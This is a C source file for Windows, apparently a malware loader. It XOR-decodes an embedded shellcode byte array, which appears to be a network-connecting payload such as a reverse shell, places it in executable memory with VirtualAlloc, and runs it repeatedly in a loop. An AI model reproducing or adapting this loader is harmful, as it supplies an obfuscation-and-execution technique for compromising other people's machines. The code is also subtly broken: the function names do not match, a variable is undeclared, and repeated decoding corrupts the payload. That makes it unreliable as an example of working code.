#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


unsigned char encrypted_shellcode[] = "\x56\xe2\x29\x4e\x5a\x42\x66\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\xfb\xfc\xe2\x21\xf8\xb2\xe2\x21\xf8\x8a\xe2\xa5\x1d\xe0\xe0\xe2\x21\xd8\xfa\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\xe2\x21\xf8\x8a\x21\xe8\x96\xe2\xab\x7a\xcc\x2b\xd2\xb2\xa1\xa8\xa5\x2f\xd8\xaa\xaa\xaa\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\x21\xe2\xb2\xfa\xee\x21\xea\x8a\xe3\xab\x7a\x49\xfc\xe7\x9b\x63\xe2\x55\x63\xeb\x21\x9e\x22\xe2\xab\x7c\xe2\x9b\x6a\xeb\x6b\x63\xa7\x06\xeb\xab\x6b\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3\xab\x7a\xeb\x21\xae\x22\xeb\xf2\xeb\xf2\xf4\xf3\xe2\xab\x7a\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\xe2\x21\xb8\x43\xe1\x55\x55\x55\xf7\xe3\x14\xdd\xd9\x98\xf5\x99\x98\xaa\xaa\xeb\xfc\xe3\x23\x4c\xe2\x2b\x46\x0a\xab\xaa\xaa\xe3\x23\x4f\xe3\x16\xa8\xaa\xbb\xf6\x6a\x02\x35\x29\xeb\xfe\xe3\x23\x4e\xe6\x23\x5b\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe6\x23\x40\xc2\xab\xab\xaa\xaa\xf3\xeb\x10\x83\x2a\xc1\xaa\x55\x7f\xc0\xa0\xeb\xf4\xfa\xfa\xe7\x9b\x63\xe7\x9b\x6a\xe2\x55\x6a\xe2\x23\x68\xe2\x55\x6a\xe2\x23\x6b\xeb\x10\x40\xa5\x75\x4a\x55\x7f\xe2\x23\x6d\xc0\xba\xeb\xf2\xe6\x23\x48\xe2\x23\x53\xeb\x10\x33\x0f\xde\xcb\x55\x7f\x2f\x6a\xde\xa0\xe3\x55\x64\xdf\x4f\x42\x39\xaa\xaa\xaa\xe2\x29\x46\xba\xe2\x23\x48\xe7\x9b\x63\xc0\xae\xeb\xf2\xe2\x23\x53\xeb\x10\xa8\x73\x62\xf5\x55\x7f\x29\x52\xaa\xd4\xff\xe2\x29\x6e\x8a\xf4\x23\x5c\xc0\xea\xeb\xf3\xc2\xaa\xba\xaa\xaa\xeb\xf2\xe2\x23\x58\xe2\x9b\x63\xeb\x10\xf2\x0e\xf9\x4f\x55\x7f\xe2\x23\x69\xe3\x23\x6d\xe7\x9b\x63\xe3\x23\x5a\xe2\x23\x70\xe2\x23\x53\xeb\x10\xa8\x73\x62\xf5\x55\x7f\x29\x52\xaa\xd7\x82\xf2\xeb\xfd\xf3\xc2\xaa\xea\xaa\xaa\xeb\xf2\xc0\xaa\xf0\xeb\x10\xa1\x85\xa5\x9a\x55\x7f\xfd\xf3\xeb\x10\xdf\xc4\xe7\xcb\x55\x7f\xe3\x55\x64\x43\x96\x55\x55\x55\xe2\xab\x69\xe2\x83\x6c\xe2\x2f\x5c\xdf\x1e\xeb\x55\x4d\xf2\xc0\xaa\xf3\xe3\x6d\x68\x5a\x1f\x08\xfc\x55\x7f";

void decrypt_shellcode(unsigned char *shellcode, int length) {
    unsigned char key = 0xAA; // Example XOR key
    for (int i = 0; i < length; i++) {
        shellcode[i] ^= key;
    }
}

void exec_shellcode() {
    // Decrypt shellcode
    decrypt_shellcode(encrypted_shellcode, sizeof(encrypted_shellcode));

    // Allocate memory
    void *exec = VirtualAlloc(0, sizeof encrypted_shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy decrypted shellcode to allocated memory
    memcpy(exec, encrypted_shellcode, sizeof encrypted_shellcode);

    // Execute shellcode
    ((void(*)())exec)();

}

int main(){
	while (keep_running) {
        	execute_shellcode();
		Sleep(1000);
	}
	return 0;
}
